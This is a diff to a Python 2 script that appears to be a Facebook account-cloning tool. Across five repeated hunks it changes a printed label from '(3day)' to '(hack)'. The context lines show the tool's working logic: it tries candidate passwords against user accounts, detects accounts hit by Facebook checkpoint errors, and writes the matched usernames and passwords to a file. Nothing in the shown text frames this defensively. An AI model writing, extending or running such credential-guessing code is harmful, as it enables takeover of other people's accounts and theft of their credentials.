@@ -254,7 +254,7 @@ def action():
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m(3day) ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;97m(hack) ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -271,7 +271,7 @@ def action():
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;97m(3day) ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;97m(hack) ' + k + c + user + '  |  ' + pass2
                             cps = open('save/cloned.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -288,7 +288,7 @@ def action():
                                 oks.append(c+user+pass3)
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;97m(3day) ' + k + c + user + '  |  ' + pass3 
+                                    print '\033[1;97m(hack) ' + k + c + user + '  |  ' + pass3 
                                     cps = open('save/cloned.txt', 'a')
                                     cps.write(k+c+user+pass3+'\n')
                                     cps.close()
@@ -305,7 +305,7 @@ def action():
                                         oks.append(c+user+pass4)
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;97m(3day) ' + k + c + user + '  |  ' + pass4
+                                            print '\033[1;97m(hack) ' + k + c + user + '  |  ' + pass4
                                             cps = open('save/cloned.txt', 'a')
                                             cps.write(k+c+user+pass4+'\n')
                                             cps.close()
@@ -322,7 +322,7 @@ def action():
                                                 oks.append(c+user+pass5)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;97m(3day) ' + k + c + user + '  |  ' + pass5 
+                                                    print '\033[1;97m(hack) ' + k + c + user + '  |  ' + pass5 
                                                     cps = open('save/cloned.txt', 'a')
                                                     cps.write(k+c+user+pass5+'\n')
                                                     cps.close()
